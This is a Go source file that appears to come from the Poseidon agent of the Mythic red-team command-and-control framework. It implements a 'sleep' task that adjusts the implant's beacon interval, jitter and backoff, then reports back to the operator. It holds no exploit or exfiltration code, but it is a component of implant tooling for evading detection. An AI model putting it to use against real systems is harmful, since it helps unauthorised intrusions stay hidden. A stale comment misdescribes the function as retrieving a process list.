package sleep

import (
	// Standard
	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Interval       int
	Jitter         int
	BackoffDelay   int
	BackoffSeconds int
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["interval"]; ok {
		e.Interval = int(v.(float64))
	}
	if v, ok := alias["jitter"]; ok {
		e.Jitter = int(v.(float64))
	}
	if v, ok := alias["backoff_delay"]; ok {
		e.BackoffDelay = int(v.(float64))
	}
	if v, ok := alias["backoff_seconds"]; ok {
		e.BackoffSeconds = int(v.(float64))
	}
	return nil
}

// Run - interface method that retrieves a process list
func Run(task structs.Task) {
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		errResp := task.NewResponse()
		errResp.SetError(err.Error())
		task.Job.SendResponses <- errResp
		return
	}
	output := ""
	if args.Interval >= 0 {
		output += profiles.UpdateAllSleepInterval(args.Interval)
	}
	if args.Jitter >= 0 && args.Jitter <= 100 {
		output += profiles.UpdateAllSleepJitter(args.Jitter)
	}
	if args.BackoffDelay >= 0 {
		output += profiles.UpdateAllSleepBackoffDelay(args.BackoffDelay)
	}
	if args.BackoffSeconds >= 0 {
		output += profiles.UpdateAllSleepBackoffSeconds(args.BackoffSeconds)
	}
	msg := task.NewResponse()
	msg.UserOutput = output
	sleepString := profiles.GetSleepString()
	msg.ProcessResponse = &sleepString
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
